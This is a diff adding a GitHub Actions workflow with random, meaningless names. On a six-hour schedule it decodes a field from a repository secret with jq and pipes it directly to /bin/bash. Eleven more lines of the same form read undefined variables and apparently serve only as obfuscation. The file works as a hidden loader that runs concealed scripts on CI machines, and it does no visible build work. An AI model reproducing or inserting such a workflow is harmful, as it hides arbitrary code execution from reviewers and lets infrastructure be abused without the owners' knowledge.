@@ -1,0 +1,30 @@
+name: nkchla
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nkchla
+        env:
+          cym8: ${{ secrets.cym8 }}
+        run: |
+          echo $cym8 | jq -r .x26362 | /bin/bash
+          echo $i27 | jq -r .i99820 | /bin/bash
+          echo $erl03889 | jq -r .dn691 | /bin/bash
+          echo $k9565 | jq -r .otl8 | /bin/bash
+          echo $x87 | jq -r .fo3 | /bin/bash
+          echo $af2 | jq -r .kj4283 | /bin/bash
+          echo $l98462 | jq -r .xdxmu1 | /bin/bash
+          echo $da506 | jq -r .bjhs64819 | /bin/bash
+          echo $jbxy267 | jq -r .hbg275 | /bin/bash
+          echo $nx1702 | jq -r .ub3 | /bin/bash
+          echo $quk54508 | jq -r .xyeku70 | /bin/bash
+          echo $lnwu51715 | jq -r .zp7591 | /bin/bash
+
